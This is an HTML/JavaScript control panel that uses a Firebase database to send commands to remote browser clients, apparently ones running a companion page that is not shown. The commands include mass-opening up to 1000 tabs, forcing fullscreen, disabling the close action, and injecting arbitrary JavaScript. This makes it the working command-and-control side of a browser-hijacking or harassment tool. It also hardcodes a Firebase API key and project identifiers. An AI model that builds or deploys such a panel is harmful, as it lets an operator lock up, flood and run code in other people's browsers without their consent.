<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Controller - Remote Control</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #1a1a1a;
    color: #eee;
    margin: 0; padding: 0;
  }
  header {
    background: #0055ff;
    padding: 1rem;
    text-align: center;
  }
  main {
    max-width: 900px;
    margin: 1rem auto;
    padding: 1rem;
    background: #222;
    border-radius: 6px;
  }
  label, input, select, button, textarea {
    display: block;
    margin-bottom: 0.8rem;
    width: 100%;
    font-size: 1rem;
  }
  input, select, textarea {
    padding: 0.4rem;
    border-radius: 4px;
    border: none;
  }
  button {
    background: #007bff;
    color: white;
    border: none;
    padding: 0.8rem;
    cursor: pointer;
    border-radius: 4px;
    font-weight: bold;
  }
  button:hover {
    background: #0056b3;
  }
  .section {
    margin-bottom: 2rem;
  }
  h2 {
    margin-top: 0;
    border-bottom: 1px solid #444;
    padding-bottom: 0.3rem;
  }
</style>
</head>
<body>
<header>
  <h1>Controller - Remote Control</h1>
</header>
<main>
  <div class="section">
    <h2>Send Notification</h2>
    <label for="notifTitle">Title</label>
    <input type="text" id="notifTitle" placeholder="Notification Title" />
    <label for="notifMsg">Message</label>
    <textarea id="notifMsg" rows="3" placeholder="Notification message"></textarea>
    <label for="notifSound">Sound</label>
    <select id="notifSound">
      <option value="">None</option>
      <option value="default">Default</option>
      <option value="ding">Ding</option>
      <option value="alert">Alert</option>
    </select>
    <label for="notifRepeat">Repeat Count</label>
    <input type="number" id="notifRepeat" min="1" max="10" value="1" />
    <label for="notifDelay">Delay Before (ms)</label>
    <input type="number" id="notifDelay" min="0" value="0" />
    <button id="sendNotifBtn">Send Notification</button>
  </div>

  <div class="section">
    <h2>Mass Tab Open</h2>
    <label for="massTabUrl">URL to Open</label>
    <input type="text" id="massTabUrl" placeholder="https://example.com" />
    <label for="massTabCount">Number of Tabs</label>
    <input type="number" id="massTabCount" min="1" max="1000" value="10" />
    <label for="massTabDelay">Delay Between Opens (ms)</label>
    <input type="number" id="massTabDelay" min="0" value="100" />
    <label><input type="checkbox" id="massTabAutoClose" /> Auto Close Tabs After</label>
    <input type="number" id="massTabAutoCloseTime" min="1" max="3600" value="60" placeholder="Seconds" />
    <button id="sendMassTabBtn">Open Tabs</button>
  </div>

  <div class="section">
    <h2>Advanced Commands</h2>
    <label><input type="checkbox" id="advFullscreen" /> Force Fullscreen</label>
    <label><input type="checkbox" id="advDisableClose" /> Disable Close</label>
    <label><input type="checkbox" id="advMute" /> Mute Audio</label>
    <label><input type="checkbox" id="advUnmute" /> Unmute Audio</label>
    <label for="advInjectJS">Inject JavaScript (one line)</label>
    <textarea id="advInjectJS" rows="3" placeholder="alert('Hello!');"></textarea>
    <button id="sendAdvancedBtn">Send Advanced Command</button>
  </div>
</main>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
    authDomain: "notify-78da1.firebaseapp.com",
    databaseURL: "https://notify-78da1-default-rtdb.firebaseio.com",
    projectId: "notify-78da1",
    storageBucket: "notify-78da1.appspot.com",
    messagingSenderId: "936289141781",
    appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  function generateCommandId() {
    return 'cmd_' + Math.random().toString(36).substr(2, 9);
  }

  function sendCommand(data) {
    const id = generateCommandId();
    data.id = id;
    data.timestamp = Date.now();
    data.sender = "controller";
    return db.ref('commands/' + id).set(data);
  }

  document.getElementById('sendNotifBtn').onclick = () => {
    const title = document.getElementById('notifTitle').value.trim();
    const message = document.getElementById('notifMsg').value.trim();
    if (!title || !message) {
      alert('Please enter both title and message');
      return;
    }
    const sound = document.getElementById('notifSound').value;
    const repeat = parseInt(document.getElementById('notifRepeat').value) || 1;
    const delay = parseInt(document.getElementById('notifDelay').value) || 0;
    sendCommand({
      type: 'notification',
      title,
      message,
      sound,
      repeat,
      scheduleDelay: delay
    });
    alert('Notification sent!');
  };

  document.getElementById('sendMassTabBtn').onclick = () => {
    const url = document.getElementById('massTabUrl').value.trim();
    const count = parseInt(document.getElementById('massTabCount').value);
    const delay = parseInt(document.getElementById('massTabDelay').value);
    const autoClose = document.getElementById('massTabAutoClose').checked;
    const autoCloseTime = parseInt(document.getElementById('massTabAutoCloseTime').value) || 60;
    if (!url || !count || count < 1) {
      alert('Valid URL and count required!');
      return;
    }
    sendCommand({
      type: 'massTabOpen',
      url,
      count,
      delay,
      autoClose,
      autoCloseTime
    });
    alert('Mass tab open command sent!');
  };

  document.getElementById('sendAdvancedBtn').onclick = () => {
    const forceFullscreen = document.getElementById('advFullscreen').checked;
    const disableClose = document.getElementById('advDisableClose').checked;
    const muteAudio = document.getElementById('advMute').checked;
    const unmuteAudio = document.getElementById('advUnmute').checked;
    const injectJS = document.getElementById('advInjectJS').value.trim();

    if (!forceFullscreen && !disableClose && !muteAudio && !unmuteAudio && !injectJS) {
      alert('Please select or enter at least one advanced command');
      return;
    }

    sendCommand({
      type: 'advanced',
      forceFullscreen,
      disableClose,
      muteAudio,
      unmuteAudio,
      injectJS
    });
    alert('Advanced command sent!');
  };
</script>
</body>
</html>
